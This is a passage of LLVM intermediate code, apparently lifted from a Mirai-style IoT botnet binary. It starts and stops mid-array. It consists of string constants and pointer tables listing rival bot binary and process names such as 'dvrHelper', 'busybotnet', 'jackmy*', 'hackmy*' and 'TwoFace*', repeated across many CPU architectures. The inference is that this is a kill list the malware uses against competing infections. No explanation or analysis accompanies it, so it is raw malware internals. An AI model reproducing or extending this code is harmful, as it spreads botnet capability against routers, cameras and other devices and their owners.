0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_21d50.693, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_21d58.694, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_21d64.695, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_21d74.696, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_21d7c.697, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_21d84.698, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_21d90.699, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_21d98.700, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_21da0.701, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_21dac.702, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_21db8.703, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_21dc4.704, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_21dd0.705, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_21dd8.706, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_21de0.707, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_21dec.708, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_21df8.709, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_21e04.710, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_21e10.711, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_21e18.712, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_21e24.713, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_21e34.714, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_21e3c.715, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_21e44.716, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_21e50.717, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_21e5c.718, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_21e68.719, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_21e78.720, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_21e88.721, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_21e98.722, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_21ea8.723, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_21eb4.724, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_21ec0.725, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_21ed0.726, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_21ee0.727, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_21ef0.728, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_21f00.729, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_21f0c.730, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @global_var_21f1c.731, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_21f30.732, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_21f3c.733, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_21f48.734, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_21f58.735, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_21f68.736, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_21958.597, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_21f74.737, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_21f80.738, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_21f88.739, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_21f90.740, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_21f98.741, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_21fa0.742, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_21fa8.743, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_21fb0.744, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_21fb8.745, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_21fc0.746, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_21fc8.747, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_21fd0.748, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_21fd8.749, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_21fe0.750, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_21fe8.751, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_21ff0.752, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_21ff8.753, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_22000.754, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_22008.755, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_22010.756, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_22018.757, i32 0, i32 0), i8* bitcast (i32* @global_var_22020.758 to i8*), i8* bitcast (i32* @global_var_22024.759 to i8*), i8* bitcast (i32* @global_var_22028.760 to i8*), i8* bitcast (i32* @global_var_2202c.761 to i8*), i8* bitcast (i32* @global_var_22030.762 to i8*), i8* bitcast (i32* @global_var_22034.763 to i8*), i8* bitcast (i32* @global_var_22038.764 to i8*), i8* bitcast (i32* @global_var_2203c.765 to i8*), i8* bitcast (i32* @global_var_22040.766 to i8*), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_22044.767, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_22048.768, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_2204c.769, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_22050.770, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_22054.771, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_22058.772, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_2205c.773, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_22060.774, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_22064.775, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_22068.776, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_2206c.777, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_22070.778, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_22074.779, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_22080.780, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_22088.781, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_22090.782, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_22098.783, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_2209c.784, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_220a0.785, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_220a4.786, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_220a8.787, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_220ac.788, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_220b0.789, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_220b4.790, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_220b8.791, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_220bc.792, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_220c0.793, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_220c4.794, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_220c8.795, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_220cc.796, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_220d0.797, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_220d4.798, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_220d8.799, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_220dc.800, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_220e0.801, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_220e4.802, i32 0, i32 0)]
@global_var_20b70.805 = constant [8 x i8] c"jackmy*\00"
@global_var_20b78.806 = constant [9 x i8] c"busybox*\00"
@global_var_20b84.807 = constant [5 x i8] c"bin*\00"
@global_var_20b9c.808 = constant [5 x i8] c"arm*\00"
@global_var_20ba4.809 = constant [8 x i8] c"mipsel*\00"
@global_var_20bb4.810 = constant [8 x i8] c"mips64*\00"
@global_var_20bbc.811 = constant [6 x i8] c"i686*\00"
@global_var_20bc4.812 = constant [7 x i8] c"sparc*\00"
@global_var_20bf0.813 = constant [6 x i8] c"bruv*\00"
@global_var_20bf8.814 = constant [7 x i8] c"sh2eb*\00"
@global_var_20c00.815 = constant [8 x i8] c"sh2elf*\00"
@global_var_20c08.816 = constant [5 x i8] c"x86*\00"
@global_var_20c10.817 = constant [7 x i8] c"armv5*\00"
@global_var_20c18.818 = constant [9 x i8] c"armv4tl*\00"
@global_var_20c24.819 = constant [7 x i8] c"armv4*\00"
@global_var_20c2c.820 = constant [7 x i8] c"armv6*\00"
@global_var_20c34.821 = constant [9 x i8] c"powerpc*\00"
@global_var_20c40.822 = constant [14 x i8] c"powerpc440fp*\00"
@global_var_20c50.823 = constant [6 x i8] c"i586*\00"
@global_var_20c58.824 = constant [6 x i8] c"m68k*\00"
@global_var_20c60.825 = constant [8 x i8] c"x86_64*\00"
@global_var_20c68.826 = constant [12 x i8] c"jackmymips*\00"
@global_var_20c74.827 = constant [14 x i8] c"jackmymips64*\00"
@global_var_20c84.828 = constant [14 x i8] c"jackmymipsel*\00"
@global_var_20c94.829 = constant [13 x i8] c"jackmysh2eb*\00"
@global_var_20ca4.830 = constant [14 x i8] c"jackmysh2elf*\00"
@global_var_20cb4.831 = constant [11 x i8] c"jackmysh4*\00"
@global_var_20cc0.832 = constant [11 x i8] c"jackmyx86*\00"
@global_var_20ccc.833 = constant [13 x i8] c"jackmyarmv5*\00"
@global_var_20cdc.834 = constant [15 x i8] c"jackmyarmv4tl*\00"
@global_var_20cec.835 = constant [13 x i8] c"jackmyarmv4*\00"
@global_var_20cfc.836 = constant [13 x i8] c"jackmyarmv6*\00"
@global_var_20d0c.837 = constant [12 x i8] c"jackmyi686*\00"
@global_var_20d18.838 = constant [15 x i8] c"jackmypowerpc*\00"
@global_var_20d28.839 = constant [20 x i8] c"jackmypowerpc440fp*\00"
@global_var_20d3c.840 = constant [12 x i8] c"jackmyi586*\00"
@global_var_20d48.841 = constant [12 x i8] c"jackmym68k*\00"
@global_var_20d54.842 = constant [13 x i8] c"jackmysparc*\00"
@global_var_20d64.843 = constant [14 x i8] c"jackmyx86_64*\00"
@global_var_20d74.844 = constant [12 x i8] c"hackmymips*\00"
@global_var_20d80.845 = constant [14 x i8] c"hackmymips64*\00"
@global_var_20d90.846 = constant [14 x i8] c"hackmymipsel*\00"
@global_var_20da0.847 = constant [13 x i8] c"hackmysh2eb*\00"
@global_var_20db0.848 = constant [14 x i8] c"hackmysh2elf*\00"
@global_var_20dc0.849 = constant [11 x i8] c"hackmysh4*\00"
@global_var_20dcc.850 = constant [11 x i8] c"hackmyx86*\00"
@global_var_20dd8.851 = constant [13 x i8] c"hackmyarmv5*\00"
@global_var_20de8.852 = constant [15 x i8] c"hackmyarmv4tl*\00"
@global_var_20df8.853 = constant [13 x i8] c"hackmyarmv4*\00"
@global_var_20e08.854 = constant [13 x i8] c"hackmyarmv6*\00"
@global_var_20e18.855 = constant [12 x i8] c"hackmyi686*\00"
@global_var_20e24.856 = constant [15 x i8] c"hackmypowerpc*\00"
@global_var_20e34.857 = constant [20 x i8] c"hackmypowerpc440fp*\00"
@global_var_20e48.858 = constant [12 x i8] c"hackmyi586*\00"
@global_var_20e54.859 = constant [12 x i8] c"hackmym68k*\00"
@global_var_20e60.860 = constant [13 x i8] c"hackmysparc*\00"
@global_var_20e70.861 = constant [14 x i8] c"hackmyx86_64*\00"
@global_var_20e80.862 = constant [4 x i8] c"b1*\00"
@global_var_20e84.863 = constant [4 x i8] c"b2*\00"
@global_var_20e88.864 = constant [4 x i8] c"b3*\00"
@global_var_20e8c.865 = constant [4 x i8] c"b4*\00"
@global_var_20e90.866 = constant [4 x i8] c"b5*\00"
@global_var_20e94.867 = constant [4 x i8] c"b6*\00"
@global_var_20e98.868 = constant [4 x i8] c"b7*\00"
@global_var_20e9c.869 = constant [4 x i8] c"b8*\00"
@global_var_20ea0.870 = constant [4 x i8] c"b9*\00"
@global_var_20ea4.871 = constant [5 x i8] c"b10*\00"
@global_var_20eac.872 = constant [5 x i8] c"b11*\00"
@global_var_20eb4.873 = constant [5 x i8] c"b12*\00"
@global_var_20ebc.874 = constant [5 x i8] c"b13*\00"
@global_var_20ec4.875 = constant [5 x i8] c"b14*\00"
@global_var_20ecc.876 = constant [5 x i8] c"b15*\00"
@global_var_20ed4.877 = constant [5 x i8] c"b16*\00"
@global_var_20edc.878 = constant [5 x i8] c"b17*\00"
@global_var_20ee4.879 = constant [5 x i8] c"b18*\00"
@global_var_20eec.880 = constant [5 x i8] c"b19*\00"
@global_var_20ef4.881 = constant [5 x i8] c"b20*\00"
@global_var_20efc.882 = constant [18 x i8] c"busyboxterrorist*\00"
@global_var_20f10.883 = constant [10 x i8] c"DFhxdhdf*\00"
@global_var_20f1c.884 = constant [11 x i8] c"dvrHelper*\00"
@global_var_20f28.885 = constant [9 x i8] c"FDFDHFC*\00"
@global_var_20f34.886 = constant [6 x i8] c"FEUB*\00"
@global_var_20f3c.887 = constant [10 x i8] c"FTUdftui*\00"
@global_var_20f48.888 = constant [10 x i8] c"GHfjfgvj*\00"
@global_var_20f54.889 = constant [7 x i8] c"jhUOH*\00"
@global_var_20f5c.890 = constant [10 x i8] c"JIPJIPJj*\00"
@global_var_20f68.891 = constant [11 x i8] c"JIPJuipjh*\00"
@global_var_20f74.892 = constant [9 x i8] c"kmymips*\00"
@global_var_20f80.893 = constant [11 x i8] c"kmymips64*\00"
@global_var_20f8c.894 = constant [11 x i8] c"kmymipsel*\00"
@global_var_20f98.895 = constant [10 x i8] c"kmysh2eb*\00"
@global_var_20fa4.896 = constant [11 x i8] c"kmysh2elf*\00"
@global_var_20fb0.897 = constant [8 x i8] c"kmysh4*\00"
@global_var_20fb8.898 = constant [8 x i8] c"kmyx86*\00"
@global_var_20fc0.899 = constant [10 x i8] c"kmyarmv5*\00"
@global_var_20fcc.900 = constant [12 x i8] c"kmyarmv4tl*\00"
@global_var_20fd8.901 = constant [10 x i8] c"kmyarmv4*\00"
@global_var_20fe4.902 = constant [10 x i8] c"kmyarmv6*\00"
@global_var_20ff0.903 = constant [9 x i8] c"kmyi686*\00"
@global_var_20ffc.904 = constant [12 x i8] c"kmypowerpc*\00"
@global_var_21008.905 = constant [17 x i8] c"kmypowerpc440fp*\00"
@global_var_2101c.906 = constant [9 x i8] c"kmyi586*\00"
@global_var_21028.907 = constant [9 x i8] c"kmym68k*\00"
@global_var_21034.908 = constant [10 x i8] c"kmysparc*\00"
@global_var_21040.909 = constant [11 x i8] c"kmyx86_64*\00"
@global_var_2104c.910 = constant [9 x i8] c"lolmips*\00"
@global_var_21058.911 = constant [11 x i8] c"lolmips64*\00"
@global_var_21064.912 = constant [11 x i8] c"lolmipsel*\00"
@global_var_21070.913 = constant [10 x i8] c"lolsh2eb*\00"
@global_var_2107c.914 = constant [11 x i8] c"lolsh2elf*\00"
@global_var_21088.915 = constant [8 x i8] c"lolsh4*\00"
@global_var_21090.916 = constant [8 x i8] c"lolx86*\00"
@global_var_21098.917 = constant [10 x i8] c"lolarmv5*\00"
@global_var_210a4.918 = constant [12 x i8] c"lolarmv4tl*\00"
@global_var_210b0.919 = constant [10 x i8] c"lolarmv4*\00"
@global_var_210bc.920 = constant [10 x i8] c"lolarmv6*\00"
@global_var_210c8.921 = constant [9 x i8] c"loli686*\00"
@global_var_210d4.922 = constant [12 x i8] c"lolpowerpc*\00"
@global_var_210e0.923 = constant [17 x i8] c"lolpowerpc440fp*\00"
@global_var_210f4.924 = constant [9 x i8] c"loli586*\00"
@global_var_21100.925 = constant [9 x i8] c"lolm68k*\00"
@global_var_2110c.926 = constant [10 x i8] c"lolsparc*\00"
@global_var_21118.927 = constant [9 x i8] c"RYrydry*\00"
@global_var_21124.928 = constant [9 x i8] c"telmips*\00"
@global_var_21130.929 = constant [11 x i8] c"telmips64*\00"
@global_var_2113c.930 = constant [11 x i8] c"telmipsel*\00"
@global_var_21148.931 = constant [10 x i8] c"telsh2eb*\00"
@global_var_21154.932 = constant [11 x i8] c"telsh2elf*\00"
@global_var_21160.933 = constant [8 x i8] c"telsh4*\00"
@global_var_21168.934 = constant [8 x i8] c"telx86*\00"
@global_var_21170.935 = constant [10 x i8] c"telarmv5*\00"
@global_var_2117c.936 = constant [12 x i8] c"telarmv4tl*\00"
@global_var_21188.937 = constant [10 x i8] c"telarmv4*\00"
@global_var_21194.938 = constant [10 x i8] c"telarmv6*\00"
@global_var_211a0.939 = constant [9 x i8] c"teli686*\00"
@global_var_211ac.940 = constant [12 x i8] c"telpowerpc*\00"
@global_var_211b8.941 = constant [17 x i8] c"telpowerpc440fp*\00"
@global_var_211cc.942 = constant [9 x i8] c"teli586*\00"
@global_var_211d8.943 = constant [9 x i8] c"telm68k*\00"
@global_var_211e4.944 = constant [10 x i8] c"telsparc*\00"
@global_var_211f0.945 = constant [11 x i8] c"telx86_64*\00"
@global_var_211fc.946 = constant [13 x i8] c"TwoFacemips*\00"
@global_var_2120c.947 = constant [15 x i8] c"TwoFacemips64*\00"
@global_var_2121c.948 = constant [15 x i8] c"TwoFacemipsel*\00"
@global_var_2122c.949 = constant [14 x i8] c"TwoFacesh2eb*\00"
@global_var_2123c.950 = constant [15 x i8] c"TwoFacesh2elf*\00"
@global_var_2124c.951 = constant [12 x i8] c"TwoFacesh4*\00"
@global_var_21258.952 = constant [12 x i8] c"TwoFacex86*\00"
@global_var_21264.953 = constant [14 x i8] c"TwoFacearmv5*\00"
@global_var_21274.954 = constant [16 x i8] c"TwoFacearmv4tl*\00"
@global_var_21284.955 = constant [14 x i8] c"TwoFacearmv4*\00"
@global_var_21294.956 = constant [14 x i8] c"TwoFacearmv6*\00"
@global_var_212a4.957 = constant [13 x i8] c"TwoFacei686*\00"
@global_var_212b4.958 = constant [16 x i8] c"TwoFacepowerpc*\00"
@global_var_212c4.959 = constant [21 x i8] c"TwoFacepowerpc440fp*\00"
@global_var_212dc.960 = constant [13 x i8] c"TwoFacei586*\00"
@global_var_212ec.961 = constant [13 x i8] c"TwoFacem68k*\00"
@global_var_212fc.962 = constant [14 x i8] c"TwoFacesparc*\00"
@global_var_2130c.963 = constant [15 x i8] c"TwoFacex86_64*\00"
@global_var_2131c.964 = constant [10 x i8] c"UYyuyioy*\00"
@global_var_21328.965 = constant [10 x i8] c"XDzdfxzf*\00"
@global_var_21334.966 = constant [6 x i8] c"xxb1*\00"
@global_var_2133c.967 = constant [6 x i8] c"xxb2*\00"
@global_var_21344.968 = constant [6 x i8] c"xxb3*\00"
@global_var_2134c.969 = constant [6 x i8] c"xxb4*\00"
@global_var_21354.970 = constant [6 x i8] c"xxb5*\00"
@global_var_2135c.971 = constant [6 x i8] c"xxb6*\00"
@global_var_21364.972 = constant [6 x i8] c"xxb7*\00"
@global_var_2136c.973 = constant [6 x i8] c"xxb8*\00"
@global_var_21374.974 = constant [6 x i8] c"xxb9*\00"
@global_var_2137c.975 = constant [7 x i8] c"xxb10*\00"
@global_var_21384.976 = constant [7 x i8] c"xxb11*\00"
@global_var_2138c.977 = constant [7 x i8] c"xxb12*\00"
@global_var_21394.978 = constant [7 x i8] c"xxb13*\00"
@global_var_2139c.979 = constant [7 x i8] c"xxb14*\00"
@global_var_213a4.980 = constant [7 x i8] c"xxb15*\00"
@global_var_213ac.981 = constant [7 x i8] c"xxb16*\00"
@global_var_213b4.982 = constant [7 x i8] c"xxb17*\00"
@global_var_213bc.983 = constant [7 x i8] c"xxb18*\00"
@global_var_213c4.984 = constant [7 x i8] c"xxb19*\00"
@global_var_213cc.985 = constant [7 x i8] c"xxb20*\00"
@global_var_213d4.986 = constant [3 x i8] c"1*\00"
@global_var_213d8.987 = constant [3 x i8] c"2*\00"
@global_var_213dc.988 = constant [3 x i8] c"3*\00"
@global_var_213e0.989 = constant [3 x i8] c"4*\00"
@global_var_213e4.990 = constant [3 x i8] c"5*\00"
@global_var_213e8.991 = constant [3 x i8] c"6*\00"
@global_var_213ec.992 = constant [3 x i8] c"7*\00"
@global_var_213f0.993 = constant [3 x i8] c"8*\00"
@global_var_213f4.994 = constant [3 x i8] c"9*\00"
@global_var_213f8.995 = constant [4 x i8] c"10*\00"
@global_var_213fc.996 = constant [4 x i8] c"11*\00"
@global_var_21400.997 = constant [4 x i8] c"12*\00"
@global_var_21404.998 = constant [4 x i8] c"13*\00"
@global_var_21408.999 = constant [4 x i8] c"14*\00"
@global_var_2140c.1000 = constant [4 x i8] c"15*\00"
@global_var_21410.1001 = constant [4 x i8] c"16*\00"
@global_var_21414.1002 = constant [4 x i8] c"17*\00"
@global_var_21418.1003 = constant [4 x i8] c"18*\00"
@global_var_2141c.1004 = constant [4 x i8] c"19*\00"
@global_var_21420.1005 = constant [4 x i8] c"20*\00"
@global_var_21424.1006 = constant [4 x i8] c"bb*\00"
@global_var_21428.1007 = constant [12 x i8] c"busybotnet*\00"
@global_var_21434.1008 = constant [6 x i8] c"pppd*\00"
@global_var_2143c.1009 = constant [7 x i8] c"pppoe*\00"
@global_var_21444.1010 = constant [6 x i8] c"wput*\00"
@global_var_2144c.1011 = constant [4 x i8] c"B1*\00"
@global_var_21450.1012 = constant [4 x i8] c"B2*\00"
@global_var_21454.1013 = constant [4 x i8] c"B3*\00"
@global_var_21458.1014 = constant [4 x i8] c"B4*\00"
@global_var_2145c.1015 = constant [4 x i8] c"B5*\00"
@global_var_21460.1016 = constant [4 x i8] c"B6*\00"
@global_var_21464.1017 = constant [4 x i8] c"B7*\00"
@global_var_21468.1018 = constant [4 x i8] c"B8*\00"
@global_var_2146c.1019 = constant [4 x i8] c"B9*\00"
@global_var_21470.1020 = constant [5 x i8] c"B10*\00"
@global_var_21478.1021 = constant [5 x i8] c"B11*\00"
@global_var_21480.1022 = constant [5 x i8] c"B12*\00"
@global_var_21488.1023 = constant [5 x i8] c"B13*\00"
@global_var_21490.1024 = constant [5 x i8] c"B14*\00"
@global_var_21498.1025 = constant [5 x i8] c"B15*\00"
@global_var_214a0.1026 = constant [5 x i8] c"B16*\00"
@global_var_214a8.1027 = constant [5 x i8] c"B17*\00"
@global_var_214b0.1028 = constant [5 x i8] c"B18*\00"
@global_var_214b8.1029 = constant [5 x i8] c"B20*\00"
@global_var_214c0.1030 = constant [11 x i8] c"dvrhelper*\00"
@global_var_214cc.1031 = constant [241 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_20b70.805, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_20b78.806, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_20b84.807, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_20b8c.571, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_20b94.576, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_20b9c.808, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_20ba4.809, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_20bac.570, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_20bb4.810, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_20bbc.811, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_20bc4.812, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_20bcc.574, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_20bd4.565, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_20bdc.575, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_20be8.567, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_20bf0.813, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_20bac.570, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_20bb4.810, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_20ba4.809, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_20bf8.814, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_20c00.815, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_20bcc.574, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_20c08.816, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_20b9c.808, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_20c10.817, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_20c18.818, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_20c24.819, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_20c2c.820, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_20bbc.811, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_20c34.821, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_20c40.822, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_20c50.823, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_20c58.824, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_20bc4.812, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_20c60.825, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_20c68.826, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_20c74.827, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_20c84.828, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_20c94.829, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_20ca4.830, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_20cb4.831, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_20cc0.832, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_20ccc.833, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_20cdc.834, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_20cec.835, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_20cfc.836, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* 